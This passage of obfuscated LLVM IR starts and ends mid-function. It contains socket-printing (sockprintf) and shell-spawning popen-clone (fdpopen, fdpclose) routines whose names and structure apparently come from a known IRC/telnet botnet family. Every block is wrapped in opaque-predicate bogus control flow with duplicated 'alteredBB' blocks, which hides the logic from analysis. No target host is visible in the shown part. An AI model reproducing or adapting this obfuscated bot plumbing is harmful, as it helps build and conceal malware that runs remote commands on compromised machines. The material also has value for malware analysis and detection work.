  %29 = mul i32 %26, %28
  %30 = urem i32 %29, 2
  %31 = icmp eq i32 %30, 0
  %32 = icmp slt i32 %27, 10
  %33 = or i1 %31, %32
  br i1 %33, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %34

; <label>:34:                                     ; preds = %originalBBpart2, %7
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %15
  %35 = bitcast i32* %4 to i8*
  %36 = call i64 @write(i32 1, i8* %35, i64 1)
  br label %originalBB
}

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #2

declare i64 @write(i32, i8*, i64) #3

; Function Attrs: noinline nounwind uwtable
define i32 @szprintf(i8*, i8*, ...) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %6 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %7 = bitcast %struct.__va_list_tag* %6 to i8*
  call void @llvm.va_start(i8* %7)
  %8 = load i8*, i8** %4, align 8
  %9 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %10 = call i32 @print(i8** %3, i8* %8, %struct.__va_list_tag* %9)
  ret i32 %10
}

; Function Attrs: noinline nounwind uwtable
define i32 @sockprintf(i32, i8*, ...) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca [1 x %struct.__va_list_tag], align 16
  %8 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8* %1, i8** %4, align 8
  %9 = call noalias i8* @malloc(i64 2048) #2
  store i8* %9, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  call void @llvm.memset.p0i8.i64(i8* %10, i8 0, i64 2048, i32 1, i1 false)
  %11 = load i8*, i8** %5, align 8
  store i8* %11, i8** %6, align 8
  %12 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %13 = bitcast %struct.__va_list_tag* %12 to i8*
  call void @llvm.va_start(i8* %13)
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %16 = call i32 @print(i8** %5, i8* %14, %struct.__va_list_tag* %15)
  %17 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %18 = bitcast %struct.__va_list_tag* %17 to i8*
  call void @llvm.va_end(i8* %18)
  %19 = load i8*, i8** %6, align 8
  %20 = load i8*, i8** %6, align 8
  %21 = call i64 @strlen(i8* %20) #10
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  store i8 10, i8* %22, align 1
  %23 = load i32, i32* %3, align 4
  %24 = load i8*, i8** %6, align 8
  %25 = load i8*, i8** %6, align 8
  %26 = call i64 @strlen(i8* %25) #10
  %27 = call i64 @send(i32 %23, i8* %24, i64 %26, i32 16384)
  %28 = trunc i64 %27 to i32
  store i32 %28, i32* %8, align 4
  %29 = load i8*, i8** %6, align 8
  call void @free(i8* %29) #2
  %30 = load i32, i32* %8, align 4
  ret i32 %30
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #4

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #5

declare i64 @send(i32, i8*, i64, i32) #3

; Function Attrs: nounwind
declare void @free(i8*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @fdpopen(i8*, i8*) #0 {
  %3 = load i32, i32* @x.19
  %4 = load i32, i32* @y.20
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i8*, align 8
  %14 = alloca i32, align 4
  %15 = alloca [2 x i32], align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  store i8* %0, i8** %12, align 8
  store i8* %1, i8** %13, align 8
  %18 = load i8*, i8** %13, align 8
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp ne i32 %20, 114
  %22 = load i32, i32* @x.19
  %23 = load i32, i32* @y.20
  %24 = sub i32 %22, 1
  %25 = mul i32 %22, %24
  %26 = urem i32 %25, 2
  %27 = icmp eq i32 %26, 0
  %28 = icmp slt i32 %23, 10
  %29 = or i1 %27, %28
  br i1 %29, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %21, label %30, label %51

; <label>:30:                                     ; preds = %originalBBpart2
  %31 = load i32, i32* @x.19
  %32 = load i32, i32* @y.20
  %33 = sub i32 %31, 1
  %34 = mul i32 %31, %33
  %35 = urem i32 %34, 2
  %36 = icmp eq i32 %35, 0
  %37 = icmp slt i32 %32, 10
  %38 = or i1 %36, %37
  br i1 %38, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %30
  %39 = load i8*, i8** %13, align 8
  %40 = load i8, i8* %39, align 1
  %41 = zext i8 %40 to i32
  %42 = icmp ne i32 %41, 119
  %43 = load i32, i32* @x.19
  %44 = load i32, i32* @y.20
  %45 = sub i32 %43, 1
  %46 = mul i32 %43, %45
  %47 = urem i32 %46, 2
  %48 = icmp eq i32 %47, 0
  %49 = icmp slt i32 %44, 10
  %50 = or i1 %48, %49
  br i1 %50, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %42, label %57, label %51

; <label>:51:                                     ; preds = %originalBBpart24, %originalBBpart2
  %52 = load i8*, i8** %13, align 8
  %53 = getelementptr inbounds i8, i8* %52, i64 1
  %54 = load i8, i8* %53, align 1
  %55 = zext i8 %54 to i32
  %56 = icmp ne i32 %55, 0
  br i1 %56, label %57, label %58

; <label>:57:                                     ; preds = %51, %originalBBpart24
  store i32 -1, i32* %11, align 4
  br label %301

; <label>:58:                                     ; preds = %51
  %59 = load i32, i32* @x.19
  %60 = load i32, i32* @y.20
  %61 = sub i32 %59, 1
  %62 = mul i32 %59, %61
  %63 = urem i32 %62, 2
  %64 = icmp eq i32 %63, 0
  %65 = icmp slt i32 %60, 10
  %66 = or i1 %64, %65
  br i1 %66, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %58
  %67 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i32 0, i32 0
  %68 = call i32 @pipe(i32* %67) #2
  %69 = icmp slt i32 %68, 0
  %70 = load i32, i32* @x.19
  %71 = load i32, i32* @y.20
  %72 = sub i32 %70, 1
  %73 = mul i32 %70, %72
  %74 = urem i32 %73, 2
  %75 = icmp eq i32 %74, 0
  %76 = icmp slt i32 %71, 10
  %77 = or i1 %75, %76
  br i1 %77, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %69, label %78, label %79

; <label>:78:                                     ; preds = %originalBBpart28
  store i32 -1, i32* %11, align 4
  br label %301

; <label>:79:                                     ; preds = %originalBBpart28
  %80 = load i32, i32* @x.19
  %81 = load i32, i32* @y.20
  %82 = sub i32 %80, 1
  %83 = mul i32 %80, %82
  %84 = urem i32 %83, 2
  %85 = icmp eq i32 %84, 0
  %86 = icmp slt i32 %81, 10
  %87 = or i1 %85, %86
  br i1 %87, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %79
  %88 = load i32*, i32** @fdopen_pids, align 8
  %89 = icmp eq i32* %88, null
  %90 = load i32, i32* @x.19
  %91 = load i32, i32* @y.20
  %92 = sub i32 %90, 1
  %93 = mul i32 %90, %92
  %94 = urem i32 %93, 2
  %95 = icmp eq i32 %94, 0
  %96 = icmp slt i32 %91, 10
  %97 = or i1 %95, %96
  br i1 %97, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %89, label %98, label %134

; <label>:98:                                     ; preds = %originalBBpart212
  %99 = call i32 @getdtablesize() #2
  store i32 %99, i32* %16, align 4
  %100 = icmp sle i32 %99, 0
  br i1 %100, label %101, label %102

; <label>:101:                                    ; preds = %98
  store i32 -1, i32* %11, align 4
  br label %301

; <label>:102:                                    ; preds = %98
  %103 = load i32, i32* %16, align 4
  %104 = sext i32 %103 to i64
  %105 = mul i64 %104, 4
  %106 = trunc i64 %105 to i32
  %107 = zext i32 %106 to i64
  %108 = call noalias i8* @malloc(i64 %107) #2
  %109 = bitcast i8* %108 to i32*
  store i32* %109, i32** @fdopen_pids, align 8
  %110 = icmp eq i32* %109, null
  br i1 %110, label %111, label %128

; <label>:111:                                    ; preds = %102
  %112 = load i32, i32* @x.19
  %113 = load i32, i32* @y.20
  %114 = sub i32 %112, 1
  %115 = mul i32 %112, %114
  %116 = urem i32 %115, 2
  %117 = icmp eq i32 %116, 0
  %118 = icmp slt i32 %113, 10
  %119 = or i1 %117, %118
  br i1 %119, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %111
  store i32 -1, i32* %11, align 4
  %120 = load i32, i32* @x.19
  %121 = load i32, i32* @y.20
  %122 = sub i32 %120, 1
  %123 = mul i32 %120, %122
  %124 = urem i32 %123, 2
  %125 = icmp eq i32 %124, 0
  %126 = icmp slt i32 %121, 10
  %127 = or i1 %125, %126
  br i1 %127, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %301

; <label>:128:                                    ; preds = %102
  %129 = load i32*, i32** @fdopen_pids, align 8
  %130 = bitcast i32* %129 to i8*
  %131 = load i32, i32* %16, align 4
  %132 = sext i32 %131 to i64
  %133 = mul i64 %132, 4
  call void @llvm.memset.p0i8.i64(i8* %130, i8 0, i64 %133, i32 1, i1 false)
  br label %134

; <label>:134:                                    ; preds = %128, %originalBBpart212
  %135 = call i32 @vfork() #11
  store i32 %135, i32* %17, align 4
  switch i32 %135, label %245 [
    i32 -1, label %136
    i32 0, label %143
  ]

; <label>:136:                                    ; preds = %134
  %137 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 0
  %138 = load i32, i32* %137, align 4
  %139 = call i32 @close(i32 %138)
  %140 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 1
  %141 = load i32, i32* %140, align 4
  %142 = call i32 @close(i32 %141)
  store i32 -1, i32* %11, align 4
  br label %301

; <label>:143:                                    ; preds = %134
  %144 = load i8*, i8** %13, align 8
  %145 = load i8, i8* %144, align 1
  %146 = zext i8 %145 to i32
  %147 = icmp eq i32 %146, 114
  br i1 %147, label %148, label %195

; <label>:148:                                    ; preds = %143
  %149 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 1
  %150 = load i32, i32* %149, align 4
  %151 = icmp ne i32 %150, 1
  br i1 %151, label %152, label %175

; <label>:152:                                    ; preds = %148
  %153 = load i32, i32* @x.19
  %154 = load i32, i32* @y.20
  %155 = sub i32 %153, 1
  %156 = mul i32 %153, %155
  %157 = urem i32 %156, 2
  %158 = icmp eq i32 %157, 0
  %159 = icmp slt i32 %154, 10
  %160 = or i1 %158, %159
  br i1 %160, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %152
  %161 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 1
  %162 = load i32, i32* %161, align 4
  %163 = call i32 @dup2(i32 %162, i32 1) #2
  %164 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 1
  %165 = load i32, i32* %164, align 4
  %166 = call i32 @close(i32 %165)
  %167 = load i32, i32* @x.19
  %168 = load i32, i32* @y.20
  %169 = sub i32 %167, 1
  %170 = mul i32 %167, %169
  %171 = urem i32 %170, 2
  %172 = icmp eq i32 %171, 0
  %173 = icmp slt i32 %168, 10
  %174 = or i1 %172, %173
  br i1 %174, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %175

; <label>:175:                                    ; preds = %originalBBpart220, %148
  %176 = load i32, i32* @x.19
  %177 = load i32, i32* @y.20
  %178 = sub i32 %176, 1
  %179 = mul i32 %176, %178
  %180 = urem i32 %179, 2
  %181 = icmp eq i32 %180, 0
  %182 = icmp slt i32 %177, 10
  %183 = or i1 %181, %182
  br i1 %183, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %175
  %184 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 0
  %185 = load i32, i32* %184, align 4
  %186 = call i32 @close(i32 %185)
  %187 = load i32, i32* @x.19
  %188 = load i32, i32* @y.20
  %189 = sub i32 %187, 1
  %190 = mul i32 %187, %189
  %191 = urem i32 %190, 2
  %192 = icmp eq i32 %191, 0
  %193 = icmp slt i32 %188, 10
  %194 = or i1 %192, %193
  br i1 %194, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br label %226

; <label>:195:                                    ; preds = %143
  %196 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 0
  %197 = load i32, i32* %196, align 4
  %198 = icmp ne i32 %197, 0
  br i1 %198, label %199, label %206

; <label>:199:                                    ; preds = %195
  %200 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 0
  %201 = load i32, i32* %200, align 4
  %202 = call i32 @dup2(i32 %201, i32 0) #2
  %203 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 0
  %204 = load i32, i32* %203, align 4
  %205 = call i32 @close(i32 %204)
  br label %206

; <label>:206:                                    ; preds = %199, %195
  %207 = load i32, i32* @x.19
  %208 = load i32, i32* @y.20
  %209 = sub i32 %207, 1
  %210 = mul i32 %207, %209
  %211 = urem i32 %210, 2
  %212 = icmp eq i32 %211, 0
  %213 = icmp slt i32 %208, 10
  %214 = or i1 %212, %213
  br i1 %214, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %206
  %215 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 1
  %216 = load i32, i32* %215, align 4
  %217 = call i32 @close(i32 %216)
  %218 = load i32, i32* @x.19
  %219 = load i32, i32* @y.20
  %220 = sub i32 %218, 1
  %221 = mul i32 %218, %220
  %222 = urem i32 %221, 2
  %223 = icmp eq i32 %222, 0
  %224 = icmp slt i32 %219, 10
  %225 = or i1 %223, %224
  br i1 %225, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br label %226

; <label>:226:                                    ; preds = %originalBBpart228, %originalBBpart224
  %227 = load i32, i32* @x.19
  %228 = load i32, i32* @y.20
  %229 = sub i32 %227, 1
  %230 = mul i32 %227, %229
  %231 = urem i32 %230, 2
  %232 = icmp eq i32 %231, 0
  %233 = icmp slt i32 %228, 10
  %234 = or i1 %232, %233
  br i1 %234, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %226
  %235 = load i8*, i8** %12, align 8
  %236 = call i32 (i8*, i8*, ...) @execl(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.304, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.305, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.306, i32 0, i32 0), i8* %235, i8* null) #2
  call void @_exit(i32 127) #12
  %237 = load i32, i32* @x.19
  %238 = load i32, i32* @y.20
  %239 = sub i32 %237, 1
  %240 = mul i32 %237, %239
  %241 = urem i32 %240, 2
  %242 = icmp eq i32 %241, 0
  %243 = icmp slt i32 %238, 10
  %244 = or i1 %242, %243
  br i1 %244, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  unreachable

; <label>:245:                                    ; preds = %134
  %246 = load i32, i32* @x.19
  %247 = load i32, i32* @y.20
  %248 = sub i32 %246, 1
  %249 = mul i32 %246, %248
  %250 = urem i32 %249, 2
  %251 = icmp eq i32 %250, 0
  %252 = icmp slt i32 %247, 10
  %253 = or i1 %251, %252
  br i1 %253, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %245
  %254 = load i8*, i8** %13, align 8
  %255 = load i8, i8* %254, align 1
  %256 = zext i8 %255 to i32
  %257 = icmp eq i32 %256, 114
  %258 = load i32, i32* @x.19
  %259 = load i32, i32* @y.20
  %260 = sub i32 %258, 1
  %261 = mul i32 %258, %260
  %262 = urem i32 %261, 2
  %263 = icmp eq i32 %262, 0
  %264 = icmp slt i32 %259, 10
  %265 = or i1 %263, %264
  br i1 %265, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  br i1 %257, label %266, label %272

; <label>:266:                                    ; preds = %originalBBpart236
  %267 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 0
  %268 = load i32, i32* %267, align 4
  store i32 %268, i32* %14, align 4
  %269 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 1
  %270 = load i32, i32* %269, align 4
  %271 = call i32 @close(i32 %270)
  br label %278

; <label>:272:                                    ; preds = %originalBBpart236
  %273 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 1
  %274 = load i32, i32* %273, align 4
  store i32 %274, i32* %14, align 4
  %275 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 0
  %276 = load i32, i32* %275, align 4
  %277 = call i32 @close(i32 %276)
  br label %278

; <label>:278:                                    ; preds = %272, %266
  %279 = load i32, i32* @x.19
  %280 = load i32, i32* @y.20
  %281 = sub i32 %279, 1
  %282 = mul i32 %279, %281
  %283 = urem i32 %282, 2
  %284 = icmp eq i32 %283, 0
  %285 = icmp slt i32 %280, 10
  %286 = or i1 %284, %285
  br i1 %286, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %278
  %287 = load i32, i32* %17, align 4
  %288 = load i32*, i32** @fdopen_pids, align 8
  %289 = load i32, i32* %14, align 4
  %290 = sext i32 %289 to i64
  %291 = getelementptr inbounds i32, i32* %288, i64 %290
  store i32 %287, i32* %291, align 4
  %292 = load i32, i32* %14, align 4
  store i32 %292, i32* %11, align 4
  %293 = load i32, i32* @x.19
  %294 = load i32, i32* @y.20
  %295 = sub i32 %293, 1
  %296 = mul i32 %293, %295
  %297 = urem i32 %296, 2
  %298 = icmp eq i32 %297, 0
  %299 = icmp slt i32 %294, 10
  %300 = or i1 %298, %299
  br i1 %300, label %originalBBpart240, label %originalBB38alteredBB

originalBBpart240:                                ; preds = %originalBB38
  br label %301

; <label>:301:                                    ; preds = %originalBBpart240, %136, %originalBBpart216, %101, %78, %57
  %302 = load i32, i32* @x.19
  %303 = load i32, i32* @y.20
  %304 = sub i32 %302, 1
  %305 = mul i32 %302, %304
  %306 = urem i32 %305, 2
  %307 = icmp eq i32 %306, 0
  %308 = icmp slt i32 %303, 10
  %309 = or i1 %307, %308
  br i1 %309, label %originalBB42, label %originalBB42alteredBB

originalBB42:                                     ; preds = %originalBB42alteredBB, %301
  %310 = load i32, i32* %11, align 4
  %311 = load i32, i32* @x.19
  %312 = load i32, i32* @y.20
  %313 = sub i32 %311, 1
  %314 = mul i32 %311, %313
  %315 = urem i32 %314, 2
  %316 = icmp eq i32 %315, 0
  %317 = icmp slt i32 %312, 10
  %318 = or i1 %316, %317
  br i1 %318, label %originalBBpart244, label %originalBB42alteredBB

originalBBpart244:                                ; preds = %originalBB42
  ret i32 %310

originalBBalteredBB:                              ; preds = %originalBB, %2
  %319 = alloca i32, align 4
  %320 = alloca i8*, align 8
  %321 = alloca i8*, align 8
  %322 = alloca i32, align 4
  %323 = alloca [2 x i32], align 4
  %324 = alloca i32, align 4
  %325 = alloca i32, align 4
  store i8* %0, i8** %320, align 8
  store i8* %1, i8** %321, align 8
  %326 = load i8*, i8** %321, align 8
  %327 = load i8, i8* %326, align 1
  %328 = zext i8 %327 to i32
  %329 = icmp ne i32 %328, 114
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %30
  %330 = load i8*, i8** %13, align 8
  %331 = load i8, i8* %330, align 1
  %332 = zext i8 %331 to i32
  %333 = icmp ne i32 %332, 119
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %58
  %334 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i32 0, i32 0
  %335 = call i32 @pipe(i32* %334) #2
  %336 = icmp slt i32 %335, 0
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %79
  %337 = load i32*, i32** @fdopen_pids, align 8
  %338 = icmp eq i32* %337, null
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %111
  store i32 -1, i32* %11, align 4
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %152
  %339 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 1
  %340 = load i32, i32* %339, align 4
  %341 = call i32 @dup2(i32 %340, i32 1) #2
  %342 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 1
  %343 = load i32, i32* %342, align 4
  %344 = call i32 @close(i32 %343)
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %175
  %345 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 0
  %346 = load i32, i32* %345, align 4
  %347 = call i32 @close(i32 %346)
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %206
  %348 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 1
  %349 = load i32, i32* %348, align 4
  %350 = call i32 @close(i32 %349)
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %226
  %351 = load i8*, i8** %12, align 8
  %352 = call i32 (i8*, i8*, ...) @execl(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.304, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.305, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.306, i32 0, i32 0), i8* %351, i8* null) #2
  call void @_exit(i32 127) #12
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %245
  %353 = load i8*, i8** %13, align 8
  %354 = load i8, i8* %353, align 1
  %355 = zext i8 %354 to i32
  %356 = icmp eq i32 %355, 114
  br label %originalBB34

originalBB38alteredBB:                            ; preds = %originalBB38, %278
  %357 = load i32, i32* %17, align 4
  %358 = load i32*, i32** @fdopen_pids, align 8
  %359 = load i32, i32* %14, align 4
  %360 = sext i32 %359 to i64
  %361 = getelementptr inbounds i32, i32* %358, i64 %360
  store i32 %357, i32* %361, align 4
  %362 = load i32, i32* %14, align 4
  store i32 %362, i32* %11, align 4
  br label %originalBB38

originalBB42alteredBB:                            ; preds = %originalBB42, %301
  %363 = load i32, i32* %11, align 4
  br label %originalBB42
}

; Function Attrs: nounwind
declare i32 @pipe(i32*) #4

; Function Attrs: nounwind
declare i32 @getdtablesize() #4

; Function Attrs: nounwind returns_twice
declare i32 @vfork() #6

declare i32 @close(i32) #3

; Function Attrs: nounwind
declare i32 @dup2(i32, i32) #4

; Function Attrs: nounwind
declare i32 @execl(i8*, i8*, ...) #4

; Function Attrs: noreturn
declare void @_exit(i32) #7

; Function Attrs: noinline nounwind uwtable
define i32 @fdpclose(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.__sigset_t, align 8
  %6 = alloca %struct.__sigset_t, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.in_addr, align 4
  store i32 %0, i32* %3, align 4
  %10 = load i32*, i32** @fdopen_pids, align 8
  %11 = icmp eq i32* %10, null
  br i1 %11, label %19, label %12

; <label>:12:                                     ; preds = %1
  %13 = load i32*, i32** @fdopen_pids, align 8
  %14 = load i32, i32* %3, align 4
  %15 = sext i32 %14 to i64
  %16 = getelementptr inbounds i32, i32* %13, i64 %15
  %17 = load i32, i32* %16, align 4
  %18 = icmp eq i32 %17, 0
  br i1 %18, label %19, label %36

; <label>:19:                                     ; preds = %12, %1
  %20 = load i32, i32* @x.21
  %21 = load i32, i32* @y.22
  %22 = sub i32 %20, 1
  %23 = mul i32 %20, %22
  %24 = urem i32 %23, 2
  %25 = icmp eq i32 %24, 0
  %26 = icmp slt i32 %21, 10
  %27 = or i1 %25, %26
  br i1 %27, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %19
  store i32 -1, i32* %2, align 4
  %28 = load i32, i32* @x.21
  %29 = load i32, i32* @y.22
  %30 = sub i32 %28, 1
  %31 = mul i32 %28, %30
  %32 = urem i32 %31, 2
  %33 = icmp eq i32 %32, 0
  %34 = icmp slt i32 %29, 10
  %35 = or i1 %33, %34
  br i1 %35, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %142

; <label>:36:                                     ; preds = %12
  %37 = load i32, i32* %3, align 4
  %38 = call i32 @close(i32 %37)
  %39 = call i32 @sigemptyset(%struct.__sigset_t* %6) #2
  %40 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 2) #2
  %41 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 3) #2
  %42 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 1) #2
  %43 = call i32 @sigprocmask(i32 0, %struct.__sigset_t* %6, %struct.__sigset_t* %5) #2
  br label %44

; <label>:44:                                     ; preds = %originalBBpart28, %36
  %45 = load i32*, i32** @fdopen_pids, align 8
  %46 = load i32, i32* %3, align 4
  %47 = sext i32 %46 to i64
  %48 = getelementptr inbounds i32, i32* %45, i64 %47
  %49 = load i32, i32* %48, align 4
  %50 = call i32 @waitpid(i32 %49, i32* %7, i32 0)
  store i32 %50, i32* %8, align 4
  br label %51

; <label>:51:                                     ; preds = %44
  %52 = load i32, i32* @x.21
  %53 = load i32, i32* @y.22
  %54 = sub i32 %52, 1
  %55 = mul i32 %52, %54
  %56 = urem i32 %55, 2
  %57 = icmp eq i32 %56, 0
  %58 = icmp slt i32 %53, 10
  %59 = or i1 %57, %58
  br i1 %59, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %51
  %60 = load i32, i32* %8, align 4
  %61 = icmp eq i32 %60, -1
  %62 = load i32, i32* @x.21
  %63 = load i32, i32* @y.22
  %64 = sub i32 %62, 1
  %65 = mul i32 %62, %64
  %66 = urem i32 %65, 2
  %67 = icmp eq i32 %66, 0
  %68 = icmp slt i32 %63, 10
  %69 = or i1 %67, %68
  br i1 %69, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %61, label %70, label %74

; <label>:70:                                     ; preds = %originalBBpart24
  %71 = call i32* @__errno_location() #13
  %72 = load i32, i32* %71, align 4
  %73 = icmp eq i32 %72, 4
  br label %74

; <label>:74:                                     ; preds = %70, %originalBBpart24
  %75 = phi i1 [ false, %originalBBpart24 ], [ %73, %70 ]
  %76 = load i32, i32* @x.21
  %77 = load i32, i32* @y.22
  %78 = sub i32 %76, 1
  %79 = mul i32 %76, %78
  %80 = urem i32 %79, 2
  %81 = icmp eq i32 %80, 0
  %82 = icmp slt i32 %77, 10
  %83 = or i1 %81, %82
  br i1 %83, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %74
  %84 = load i32, i32* @x.21
  %85 = load i32, i32* @y.22
  %86 = sub i32 %84, 1
  %87 = mul i32 %84, %86
  %88 = urem i32 %87, 2
  %89 = icmp eq i32 %88, 0
  %90 = icmp slt i32 %85, 10
  %91 = or i1 %89, %90
  br i1 %91, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %75, label %44, label %92

; <label>:92:                                     ; preds = %originalBBpart28
  %93 = load i32, i32* @x.21
  %94 = load i32, i32* @y.22
  %95 = sub i32 %93, 1
  %96 = mul i32 %93, %95
  %97 = urem i32 %96, 2
  %98 = icmp eq i32 %97, 0
  %99 = icmp slt i32 %94, 10
  %100 = or i1 %98, %99
  br i1 %100, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %92
  %101 = call i32 @sigprocmask(i32 2, %struct.__sigset_t* %5, %struct.__sigset_t* null) #2
  %102 = load i32*, i32** @fdopen_pids, align 8
  %103 = load i32, i32* %4, align 4
  %104 = sext i32 %103 to i64
  %105 = getelementptr inbounds i32, i32* %102, i64 %104
  store i32 0, i32* %105, align 4
  %106 = load i32, i32* %8, align 4
  %107 = icmp eq i32 %106, -1
  %108 = load i32, i32* @x.21
  %109 = load i32, i32* @y.22
  %110 = sub i32 %108, 1
  %111 = mul i32 %108, %110
  %112 = urem i32 %111, 2
  %113 = icmp eq i32 %112, 0
  %114 = icmp slt i32 %109, 10
  %115 = or i1 %113, %114
  br i1 %115, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %107, label %116, label %133

; <label>:116:                                    ; preds = %originalBBpart212
  %117 = load i32, i32* @x.21
  %118 = load i32, i32* @y.22
  %119 = sub i32 %117, 1
  %120 = mul i32 %117, %119
  %121 = urem i32 %120, 2
